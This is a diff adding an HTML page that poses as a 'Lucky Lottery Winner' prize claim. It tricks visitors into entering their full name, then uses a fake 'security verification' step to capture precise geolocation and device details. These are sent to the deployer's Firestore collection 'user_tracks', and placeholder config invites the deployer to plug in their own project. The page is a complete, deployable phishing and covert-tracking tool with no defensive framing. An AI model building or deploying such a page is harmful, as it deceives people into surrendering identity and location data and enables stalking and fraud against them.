@@ -1,1 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lucky Lottery Winner!</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(135deg, #ffcc00 0%, #ff3300 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 35px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            text-align: center;
+            max-width: 380px;
+            width: 90%;
+        }
+        h2 { color: #d32f2f; margin-top: 0; font-size: 26px; }
+        p { color: #333; font-size: 15px; line-height: 1.5; }
+        .prize-box {
+            background-color: #fff9c4;
+            border: 2px dashed #fbc02d;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 22px;
+            font-weight: bold;
+            color: #f57c00;
+            margin: 20px 0;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            box-shadow: 0 4px 10px rgba(76,175,80,0.3);
+        }
+        button:hover { background-color: #43a047; }
+        #locationBtn { background-color: #0071e3; display: none; box-shadow: 0 4px 10px rgba(0,113,227,0.3); }
+        #locationBtn:hover { background-color: #0077ed; }
+        #status { margin-top: 15px; color: #6e6e73; font-size: 13px; }
+    </style>
+</head>
+<body>
 
+<div class="card">
+    <div id="step1">
+        <h2>🎉 Congratulations! 🎉</h2>
+        <p>Your tracking ID has been selected as today's grand prize winner!</p>
+        <div class="prize-box">🎁 Mega Cash Prize 🎁</div>
+        <p>Please enter your official full name below to begin the claim process:</p>
+        <input type="text" id="userName" placeholder="Enter your full name..." autocomplete="off">
+        <button id="proceedBtn">Proceed to Claim</button>
+    </div>
+
+    <div id="step2" style="display: none;">
+        <h2>Security Verification</h2>
+        <p>To security-match your regional lottery ticket, please sync your device location matrix with our claims department servers.</p>
+        <button id="locationBtn">Verify Location & Release Prize</button>
+        <div id="status">Awaiting verification sync...</div>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    // ⚠️ REPLACE THIS BLOCK WITH YOUR REAL CONFIG snippet from your Firebase settings dashboard!
+    const firebaseConfig = {
+        apiKey: "YOUR_API_KEY",
+        authDomain: "YOUR_AUTH_DOMAIN",
+        projectId: "YOUR_PROJECT_ID",
+        storageBucket: "YOUR_STORAGE_BUCKET",
+        messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+        appId: "YOUR_APP_ID",
+        measurementId: "YOUR_MEASUREMENT_ID"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const userNameInput = document.getElementById('userName');
+    const proceedBtn = document.getElementById('proceedBtn');
+    const locationBtn = document.getElementById('locationBtn');
+    const statusDiv = document.getElementById('status');
+
+    const step1Div = document.getElementById('step1');
+    const step2Div = document.getElementById('step2');
+
+    let savedName = "";
+
+    // Handle clicking "Proceed" on the lottery screen
+    proceedBtn.addEventListener('click', () => {
+        savedName = userNameInput.value.trim();
+
+        if (savedName === "") {
+            alert("Please input your name to verify ownership of the ticket.");
+            return;
+        }
+
+        // Hide Step 1 layout and reveal Step 2 layout smoothly
+        step1Div.style.display = 'none';
+        step2Div.style.display = 'block';
+        locationBtn.style.display = 'block';
+    });
+
+    // Handle clicking the location/claim verification button
+    locationBtn.addEventListener('click', () => {
+        if (!navigator.geolocation) {
+            statusDiv.textContent = "Error: Geolocation is unsupported or turned off on this device.";
+            return;
+        }
+
+        statusDiv.textContent = "Connecting to regional data servers...";
+
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                statusDiv.textContent = "Location verified! Finalizing delivery packet...";
+
+                const payload = {
+                    winnerName: savedName,
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracyInMeters: position.coords.accuracy,
+                    deviceDetails: navigator.userAgent,
+                    syncedAt: serverTimestamp()
+                };
+
+                try {
+                    // Saves the data to Firestore inside your collection
+                    await addDoc(collection(db, "user_tracks"), payload);
+                    statusDiv.innerHTML = "<span style='color: #4caf50; font-weight: bold;'>✅ Verification complete!</span><br>Your registration file is locked. Redirecting to regional claim desk...";
+                } catch (dbError) {
+                    statusDiv.textContent = "Server Error: " + dbError.message;
+                }
+            },
+            (geoError) => {
+                statusDiv.textContent = "Verification Failed: Please allow location sensor clearance to verify your area claim.";
+            },
+            { enableHighAccuracy: true, timeout: 15000 }
+        );
+    });
+</script>
+
+</body>
+</html>
